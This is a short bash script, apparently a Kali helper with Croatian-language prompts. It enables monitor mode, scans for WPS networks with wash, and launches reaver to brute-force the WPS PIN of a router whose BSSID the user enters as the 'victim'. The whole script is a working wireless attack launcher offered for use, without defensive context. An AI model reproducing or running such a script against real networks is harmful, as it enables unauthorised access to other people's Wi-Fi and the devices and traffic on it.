echo
echo "////////////////////////////////////////////////"
echo "/                                              /"
echo "/               reaver + wash                  /"
echo "/                                              /"
echo "/                 Kali-TRX                     /"
echo "/                                              /"
echo "/           Verzija skripta 1.0.0              /"
echo "/                                              /"
echo "////////////////////////////////////////////////"
echo
echo " Ovaj skript podesava sve potrbne parametre za pokretanje reaver-a i wash." 
echo
airmon-ng start wlan0
echo
xterm -bg black -fg orange -T wash -e wash -i mon0 -C & wash=$!
echo
echo "[1] Upisi mrezni interface koji se nalazi u monitor modu."
read mon
echo
echo "[2] Upisi BSSID od zrtve."
read ssid
xterm -bg black -fg orange -T reaver -e reaver -i $mon -b $ssid -vv & reaver=$!
echo
echo "[3] Reaver je uspjesno pokrenut."
echo
echo "[X] Za izlaz X"
echo
read izlaz
if [ $izlaz = "x" ] ; then
airmon-ng stop $mon
echo
airmon-ng stop wlan0
exit
fi
       


	
		
	 
	
	
	



